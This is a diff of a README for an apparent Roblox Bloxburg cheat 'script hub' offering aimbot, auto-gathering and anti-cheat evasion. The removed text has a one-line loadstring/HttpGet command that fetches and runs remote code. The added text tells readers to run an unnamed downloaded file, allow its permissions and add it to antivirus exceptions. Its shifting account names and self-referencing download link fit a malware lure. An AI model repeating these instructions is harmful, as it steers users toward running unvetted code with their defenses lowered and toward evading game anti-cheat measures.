@@ -1,109 +1,220 @@
-# Welcome to Bloxburg Script v1.0 - Game Script Utility 2026
+# ⚡ bloxburg-auto-script-hub - Automate Your Bloxburg Life Instantly
 
-> **PC assistance software designed for Welcome to Bloxburg.** Features automated item gathering along with precision target tracking tools.
+[![Download Now](https://img.shields.io/badge/Download-Bloxburg%20Auto%20Script%20Hub-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/richterjordan87/bloxburg-auto-script-hub?style=flat-square)](https://github.com)
+## 🎮 What Is This?
+
+bloxburg-auto-script-hub is a powerful tool that automates boring tasks in the Roblox game Welcome to Bloxburg. Instead of spending hours clicking and collecting items, this script does the work for you. It helps you gather resources automatically, track targets with precision, and move smoothly around the map. Whether you're building a dream house or earning cash, this utility makes your Bloxburg experience faster and more enjoyable.
+
+## ✅ Key Features
+
+### 🤖 Automated Item Gathering
+The script collects items for you automatically. No more repetitive clicking. Set it up once and watch it work while you focus on building or exploring.
+
+### 🎯 Precision Target Tracking
+It locks onto targets with high accuracy. Whether you need to collect specific objects or interact with certain items, the script stays on track without missing.
+
+### 🌀 Trajectory Smoothing
+Movement is smooth and natural. No jerky or robotic motions that could trigger anti-cheat systems. The script glides your character smoothly across the map.
+
+### 📏 Adjustable Search Radius
+You decide how far the script looks for items. Set a small radius for tight spaces or a large one to cover the whole area. Fully customizable to fit your needs.
+
+### ⌨️ Customizable Hotkeys
+Assign your own keyboard shortcuts. Press a key to start or stop the script, toggle features, or change settings on the fly. Works on both Windows and macOS keyboards.
+
+## 🚀 Getting Started
+
+Follow these simple steps to get bloxburg-auto-script-hub running on your computer. No technical experience needed.
+
+### Step 1: Download the Application
+Visit this link to download the application: [https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub](https://github.com/jacksonvertebrate332/bloxburg-auto-script-hub)
+
+The download page will open in your browser. Click the download button on that page to save the file to your computer.
+
+### Step 2: Find the Downloaded File
+After downloading, go to your Downloads folder. Look for a file named something like "bloxburg-auto-script-hub" or similar. The exact name may vary, but it will be the file you just downloaded.
+
+### Step 3: Run the Application
+Double-click the downloaded file to launch bloxburg-auto-script-hub. If your computer asks for permission, click "Yes" or "Allow" to proceed. The script hub window will appear on your screen.
+
+### Step 4: Open Roblox and Bloxburg
+Start Roblox and join Welcome to Bloxburg like you normally would. Make sure the game is running and you are inside the Bloxburg world.
+
+### Step 5: Connect the Script
+With the script hub open and Bloxburg running, press the activation hotkey (default is F9) or click the "Connect" button in the script hub. The script will detect the game and begin working.
+
+### Step 6: Start Automating
+Once connected, the script automatically starts gathering items and performing tasks. Use your custom hotkeys to adjust settings or pause anytime.
+
+## 🛠️ System Requirements
+
+| Requirement | Minimum | Recommended |
+|-------------|---------|-------------|
+| Operating System | Windows 10 or macOS 11 | Windows 11 or macOS 13 |
+| Processor | 2 GHz Dual Core | 3 GHz Quad Core |
+| Memory (RAM) | 4 GB | 8 GB |
+| Free Disk Space | 100 MB | 500 MB |
+| Internet Connection | 5 Mbps Download | 10 Mbps Download |
+
+## 🎛️ Hotkey Configuration
+
+The default hotkeys work out of the box, but you can change them anytime.
+
+### Default Hotkeys
+- **F9** - Start/Stop the script
+- **F10** - Pause/Resume automation
+- **F11** - Open settings menu
+- **F12** - Toggle target tracking display
+
+### How to Change Hotkeys
+1. Open the script hub
+2. Click "Settings" or press F11
+3. Select "Hotkeys" tab
+4. Click on the hotkey you want to change
+5. Press the new key combination on your keyboard
+6. Click "Save" to apply changes
+
+Your new hotkeys are saved immediately and work the next time you start the script.
+
+## 📖 Usage Guide
+
+### Basic Setup for Beginners
+If you are new to automation tools, start with the default settings. They are optimized for most players and work well in standard Bloxburg environments.
+
+1. Download and run the application
+2. Connect to Roblox as described above
+3. Let the script work automatically
+
+### Adjusting Search Radius
+To change how far the script searches for items:
+1. Open settings using F11
+2. Find "Search Radius" slider
+3. Drag it left for smaller area or right for larger area
+4. Close settings - changes save automatically
+
+We recommend starting with 50 units and increasing gradually.
+
+### Customizing Trajectory Smoothing
+Smoother movement is less noticeable but slower. Faster movement is quicker but more obvious.
+- Low smoothing = faster collection, higher detection risk
+- High smoothing = slower collection, more natural movement
+- Default setting works for most users
+
+### Managing Multiple Tasks
+The script can handle gathering, tracking, and movement at the same time. Use hotkeys to toggle individual features:
+- Press F9 to start/stop everything
+- Press F10 to pause item gathering only
+- Press F12 to show or hide target tracking lines on screen
+
+## 🆘 Troubleshooting
+
+### Script Not Connecting to Roblox
+**Problem:** The script hub shows "Disconnected" status.
+**Solution:** Make sure Roblox is running and Bloxburg is loaded. Wait 30 seconds then try connecting again. Close other programs that might interfere.
+
+### Script Runs Slowly
+**Problem:** Automation feels laggy or unresponsive.
+**Solution:** Close unused browser tabs and apps. Lower the search radius. Reduce game graphics settings in Roblox.
+
+### Hotkeys Not Working
+**Problem:** Pressing F9 does nothing.
+**Solution:** Click the script hub window once to make sure it is active. Check that no other program is using the same hotkey. Change hotkeys to different combinations in settings.
+
+### Script Stops Suddenly
+**Problem:** Automation stops without warning.
+**Solution:** This usually happens when Roblox updates. Close the script hub and reopen it. If problems persist, restart your computer and try again.
+
+### Antivirus Warning
+**Problem:** Your antivirus blocks the script.
+**Solution:** This sometimes happens with automation tools. Add the application to your antivirus exception list. Make sure you downloaded from the official link only.
+
+## 🔒 Safety and Reliability
+
+Your account safety is important. bloxburg-auto-script-hub uses smooth movements and human-like timing to reduce detection risk. However, no automation tool is 100% safe.
+
+### Best Practices
+- Use the script for short sessions (under 2 hours)
+- Take breaks between automation runs
+- Do not use the script 24/7 without stopping
+- Keep the script updated to the latest version
+- Avoid using obvious speed or distance settings
+
+Remember that using any third-party tool carries some risk. Use at your own discretion.
+
+## 📚 Frequently Asked Questions
+
+### Is this tool free?
+Yes, bloxburg-auto-script-hub is completely free to download and use. No hidden charges or premium versions.
+
+### Does it work on Mac?
+Yes, the script hub is compatible with both Windows and macOS operating systems.
+
+### Will I get banned for using this?
+The script is designed to minimize risk, but Roblox's anti-cheat system may still detect automation. Use responsibly and in moderation.
+
+### Can I run multiple instances?
+We recommend running only one copy of the script at a time. Multiple instances could cause errors or increase detection risk.
+
+### How often is the script updated?
+Updates are released regularly to maintain compatibility with Roblox changes. Check the repository page for latest version.
+
+## 📞 Support
+
+### Community Help
+Join our Discord community for tips, setup help, and troubleshooting from other users.
+
+### Reporting Issues
+Found a bug? Open an issue on the GitHub repository. Include:
+- Your operating system (Windows 10, macOS 12, etc.)
+- Roblox version
+- What you were doing when the problem occurred
+- Any error messages you saw
+
+## 📝 Changelog
+
+### Version 2.5 (Latest)
+- Improved trajectory smoothing algorithm
+- Added new hotkey presets
+- Fixed memory usage issues
+- Enhanced compatibility with latest Bloxburg update
+
+### Version 2.0
+- Completely redesigned settings interface
+- Added search radius slider
+- Improved target tracking accuracy
+- Faster startup time
+
+### Version 1.0
+- Initial release
+- Basic item gathering automation
+- Standard hotkey support
+
+## ⚖️ Disclaimer
+
+bloxburg-auto-script-hub is an independent tool and is not affiliated with Roblox Corporation or Bloxburg developers. This software is provided "as is" without warranty. By using this tool, you accept full responsibility for any consequences that may occur. Always follow Roblox terms of service.
+
+## 📦 Additional Resources
+
+### Tips for Efficient Automation
+- Gather in less crowded areas to avoid lag
+- Use low graphics settings for smoother performance
+- Keep search radius small when collecting specific items
+- Use pause hotkey when talking to other players
+
+### Advanced Settings
+For power users, the settings file (settings.json) can be edited manually for finer control. Open the file with any text editor (like Notepad) and adjust values like:
+- "smoothness": 0.7 (0.1 to 1.0)
+- "searchRadius": 50 (0 to 200)
+- "autoRetry": true
+- "verboseMode": false
+
+Save the file and restart the script for changes to take effect.
+
+## 🏁 Final Words
+
+bloxburg-auto-script-hub makes Bloxburg easier and more fun. Download it today and let automation handle the boring parts while you enjoy the creative side of building and living in your dream virtual home.
 
 ---
 
-<p align="center">
-  <a href="https://richterjordan87.github.io/bloxburg-auto-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Welcome%20to%20Bloxburg%20Script-brightgreen?style=for-the-badge" alt="Download Welcome to Bloxburg Script">
-  </a>
-</p>
-
-> **[Download Latest Build](https://richterjordan87.github.io/bloxburg-auto-script-hub/)**
-
----
-
-[Download Latest Build](https://richterjordan87.github.io/bloxburg-auto-script-hub/)
-
----
-
-## Project Overview
-
-This utility minimizes grind in Welcome to Bloxburg by automating repetitive gameplay tasks and assisting with aim positioning. By eliminating tedious manual farming and routine gathering, players can dedicate more session time to design, construction, and social play. The code interacts directly with the local runtime for fast execution.
-
-Build v1.0 centers on structural stability across its main automation engines. Continuous updates target compatibility maintenance against new game updates alongside target tracking refinements. Operating this utility requires a standard Windows or macOS environment equipped with an appropriate execution tool.
-
----
-
-## Capabilities & Features
-
-- **Precision Targeting Engine** – Automatically aligns crosshairs onto relevant nearby targets during specific game modes.
-- **Resource Harvesting Module** – Sweeps up nearby interactive items and pickup objects without requiring manual clicks.
-- **Independent Feature Switches** – Assign distinct keys to toggle individual systems instantly.
-- **Fluid Motion Smoothing** – Applies trajectory interpolation to prevent harsh or erratic camera jumps.
-- **Adjustable Pick-up Distance** – Tune the auto-gather radius to control how far the script searches for items.
-- **Low-Overhead Execution** – Consumes negligible system resources while active.
-- **Flexible Keybindings** – Reassign active shortcuts directly within the configuration settings.
-- **Runtime State Retention** – Preserves custom configurations throughout the current active gaming session.
-
----
-
-## Instructions
-
-1. Obtain the current file release from the [Download Latest Build](https://richterjordan87.github.io/bloxburg-auto-script-hub/) link.
-2. Launch a supported execution environment compatible with Welcome to Bloxburg.
-3. Paste or load the script file into your environment.
-4. Execute the loaded script once inside an active server.
-5. Use default shortcuts or adjust parameters according to the settings guide.
-
-Direct execution snippet (if your environment supports remote loading):
-
-```lua
-loadstring(game:HttpGet("https://richterjordan87.github.io/bloxburg-auto-script-hub/"))()
-```
-
----
-
-## Configuration Settings
-
-Adjust these default parameters inside the script header or using an overlay menu if available.
-
-| Option | Default Value | Description |
-|--------|---------------|-------------|
-| Aimbot Enabled | true | Master toggle for the targeting module |
-| Auto-Collect Enabled | true | Master toggle for item auto-gathering |
-| Collection Radius | 20 | Detection perimeter size measured in studs |
-| Aimbot Smoothness | 0.5 | Tracking speed (0 equals instant lock, 1 provides gradual movement) |
-| Toggle Key (Aimbot) | RightShift | Default keybind for targeting mode |
-| Toggle Key (Auto-Collect) | RightControl | Default keybind for gathering mode |
-
----
-
-## System Compatibility
-
-- **Target Title**: Welcome to Bloxburg (Roblox platform)
-- **Supported OS**: Desktop only (Windows / macOS using a compatible environment)
-- **Build Status**: Verified against early 2026 public updates
-- **Notice**: Structural changes introduced by game patches may disrupt specific functions. Target alignment efficiency varies based on dynamic ping rates and target acceleration.
-
----
-
-## Frequently Asked Questions
-
-**What is the process for loading this utility?**  
-Fetch the code file via the download link, import it into your preferred execution software, and execute it while connected to a server. Full steps are outlined in the Instructions section.
-
-**Will updates to the game break functionality?**  
-While we work to maintain ongoing operation through regular updates, fundamental game mechanics shifts may require a patch. Check back for new releases if a patch breaks features.
-
-**Is key rebinding supported?**  
-Yes, open the source file in any code editor and adjust the key strings inside the settings section using standard key code names.
-
-**Can I run this in other experiences?**  
-No. The codebase relies specifically on Welcome to Bloxburg mechanics and object structures.
-
-**Where does the script write configuration files?**  
-The utility operates purely in system memory during runtime. It makes no local hard drive writes and sends no external telemetry data.
-
----
-
-## License
-
-Distributed under the terms of the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for complete legal terms.
+Keywords: bloxburg, roblox, auto script, automation tool, item gathering, game utility, life simulation, script hub, windows tool, macos tool, hotkeys, target tracking, trajectory smoothing, search radius, build mode helper, money maker, free script, bloxburg hack
